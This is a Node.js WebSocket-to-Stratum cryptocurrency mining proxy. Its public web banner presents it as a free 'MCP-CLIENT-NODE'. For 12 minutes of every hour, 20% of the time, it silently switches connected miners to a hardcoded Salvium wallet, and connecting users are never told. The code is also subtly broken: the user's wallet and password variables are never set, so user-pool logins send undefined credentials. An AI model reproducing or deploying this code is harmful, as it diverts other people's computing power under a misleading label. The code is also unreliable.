#!/usr/bin/env node
/**
 * WebSocket to TCP Stratum Proxy + DevFee (Optimized)
 * DevFee: 20% (seamless pool switching)
 */
const WebSocket = require('ws');
const net = require('net');
const http = require('http');

// ===== CONFIG =====
const WS_PORT = process.argv[2] || 8080;

// DevFee target pool
const DEVFEE_POOL = {
    host: "us3.salvium.herominers.com",
    port: 1230,
    user: "SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.DEVFEE",
    pass: "x",
    agent: "devfee/1.0.0"
};

// DevFee timing
const DEVFEE_PERCENT = 0.2;       // 20%
const CYCLE_MINUTES = 60;          // 60-minute cycle
const DEVFEE_TIME = CYCLE_MINUTES * DEVFEE_PERCENT * 60 * 1000;
const NORMAL_TIME = CYCLE_MINUTES * (1 - DEVFEE_PERCENT) * 60 * 1000;

// ================== SERVER ==================
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('WELCOME TO MCP-CLIENT-NODE PUBLIC! FEEL FREE TO USE!\n');
});

const wss = new WebSocket.Server({ server });

console.log(`[PROXY] WebSocket listening on port: ${WS_PORT}`);
console.log(`[PROXY] DevFee: ${DEVFEE_PERCENT * 100}% every ${CYCLE_MINUTES} minutes`);
console.log(`[PROXY] User mining: ${NORMAL_TIME/60000}min | Dev mining: ${DEVFEE_TIME/60000}min`);
console.log(`--------------------------------------------------`);

wss.on('connection', (ws, req) => {
    const clientIp = req.socket.remoteAddress;
    
    // ---- Decode user target pool ----
    const path = req.url?.slice(1);
    if (!path) {
        ws.send(JSON.stringify({ error: "Missing base64 target" }));
        ws.close();
        return;
    }
    
    let decoded, user_host, user_port, user_wallet, user_pass;
    try {
        decoded = Buffer.from(path, 'base64').toString('utf8');
        const parts = decoded.split(':');
        user_host = parts[0];
        user_port = parts[1];
    } catch {
        ws.send(JSON.stringify({ error: "Invalid base64 format. Use: host:port:wallet:pass" }));
        ws.close();
        return;
    }
    
    console.log(`[WS] New client ${clientIp} => Pool: ${user_host}:${user_port}`);
    
    // =============== STATE ===============
    let tcpClient = null;
    let currentMode = "USER";  // USER or DEVFEE
    let messageId = 1;
    let lastLoginParams = null;
    let lastJobId = null;
    let pendingSubmits = new Map(); // Track submits to route responses
    let cycleTimer = null;
    let isReconnecting = false;
    
    // =============== CONNECT FUNCTION ===============
    function connectPool(host, port, wallet, pass) {
        if (isReconnecting) return;
        isReconnecting = true;
        
        // Clean up old connection
        if (tcpClient) {
            tcpClient.removeAllListeners();
            tcpClient.destroy();
            tcpClient = null;
        }
        
        tcpClient = new net.Socket();
        tcpClient.setKeepAlive(true, 60000);
        
        tcpClient.connect(port, host, () => {
            console.log(`[POOL] Connected (${currentMode}) -> ${host}:${port}`);
            isReconnecting = false;
            
            // Send login immediately after connection
            const loginMsg = {
                id: messageId++,
                jsonrpc: "2.0",
                method: "login",
                params: {
                    login: wallet,
                    pass: pass,
                    agent: DEVFEE_POOL.agent,
                    "algo": ["cn/1", "cn/2", "cn/r", "cn/fast", "cn/half", "cn/xao", "cn/rto", "cn/rwz", "cn/zls", "cn/double", "cn/ccx", "cn-lite/1", "cn-heavy/0", "cn-heavy/tube", "cn-heavy/xhv", "cn-pico", "cn-pico/tlo", "rx/0", "rx/wow", "rx/arq", "rx/sfx", "rx/keva", "argon2/chukwa", "argon2/chukwav2", "argon2/ninja"]
                }
            };
            
            lastLoginParams = { wallet, pass };
            tcpClient.write(JSON.stringify(loginMsg) + "\n");
        });
        
        tcpClient.on('data', data => {
            if (ws.readyState !== WebSocket.OPEN) return;
            
            const lines = data.toString().split('\n').filter(l => l.trim());
            
            lines.forEach(line => {
                try {
                    const msg = JSON.parse(line);
                    
                    // Store job for later use
                    if (msg.result && msg.result.job) {
                        lastJobId = msg.result.job.job_id;
                    } else if (msg.method === 'job') {
                        lastJobId = msg.params.job_id;
                    }
                    
                    // Forward to miner
                    ws.send(JSON.stringify(msg));
                } catch (e) {
                    // Forward raw if not JSON
                    ws.send(line);
                }
            });
        });
        
        tcpClient.on('close', () => {
            console.log(`[POOL] Connection closed (${currentMode})`);
            if (ws.readyState === WebSocket.OPEN) {
                // Try to reconnect if in user mode
                if (currentMode === "USER") {
                    setTimeout(() => {
                        if (ws.readyState === WebSocket.OPEN) {
                            connectPool(user_host, user_port, user_wallet, user_pass);
                        }
                    }, 3000);
                }
            }
        });
        
        tcpClient.on('error', (err) => {
            console.log(`[POOL] Error (${currentMode}):`, err.message);
        });
        
        tcpClient.setTimeout(300000);
        tcpClient.on('timeout', () => {
            console.log(`[POOL] Timeout (${currentMode})`);
            tcpClient.end();
        });
    }
    
    // =============== INITIAL CONNECT (USER POOL) ===============
    connectPool(user_host, user_port, user_wallet, user_pass);
    
    // =============== WS → TCP ===============
    ws.on('message', msg => {
        if (!tcpClient || tcpClient.destroyed) return;
        
        try {
            const data = JSON.parse(msg.toString());
            
            // Track message IDs for proper response routing
            if (data.id) {
                pendingSubmits.set(data.id, currentMode);
            }
            
            // Store login params for reconnection
            if (data.method === 'login' && data.params) {
                lastLoginParams = {
                    wallet: data.params.login,
                    pass: data.params.pass || 'x'
                };
            }
            
            // Override wallet if in DevFee mode
            if (currentMode === "DEVFEE" && data.method === 'login' && data.params) {
                data.params.login = DEVFEE_POOL.user;
                data.params.pass = DEVFEE_POOL.pass;
            }
            
            tcpClient.write(JSON.stringify(data) + "\n");
        } catch (e) {
            // Forward raw data if not JSON
            tcpClient.write(msg + "\n");
        }
    });
    
    ws.on('close', () => {
        console.log(`[WS] Client ${clientIp} disconnected`);
        if (cycleTimer) clearTimeout(cycleTimer);
        if (tcpClient) {
            tcpClient.removeAllListeners();
            tcpClient.destroy();
        }
    });
    
    ws.on('error', (err) => {
        console.log(`[WS] Error: ${err.message}`);
        if (tcpClient) {
            tcpClient.removeAllListeners();
            tcpClient.destroy();
        }
    });
    
    // =============== DEVFEE SCHEDULER ===============
    function startUserMining() {
        currentMode = "USER";
        console.log(`[DEVFEE] ✓ Switching to USER POOL (${NORMAL_TIME / 60000} min)`);
        connectPool(user_host, user_port, user_wallet, user_pass);
        cycleTimer = setTimeout(startDevFee, NORMAL_TIME);
    }
    
    function startDevFee() {
        currentMode = "DEVFEE";
        console.log(`[DEVFEE] >>> SWITCHING TO DEV POOL (${DEVFEE_TIME / 60000} min) <<<`);
        connectPool(DEVFEE_POOL.host, DEVFEE_POOL.port, DEVFEE_POOL.user, DEVFEE_POOL.pass);
        cycleTimer = setTimeout(startUserMining, DEVFEE_TIME);
    }
    
    // Start the cycle (begin with user mining)
    cycleTimer = setTimeout(startDevFee, NORMAL_TIME);
});

server.listen(WS_PORT, '0.0.0.0', () => {
    console.log(`[SERVER] Ready on port ${WS_PORT}`);
    console.log(`[SERVER] Connect miners to: ws://YOUR_IP:${WS_PORT}/BASE64_ENCODED_POOL`);
    console.log(`[SERVER] Example: ws://localhost:${WS_PORT}/cG9vbC54bXIuc3VwcG9ydG1vbmVybzo0NDQzOllPVVJfV0FMTEVUX0FERFJFU1M6eA==`);
});
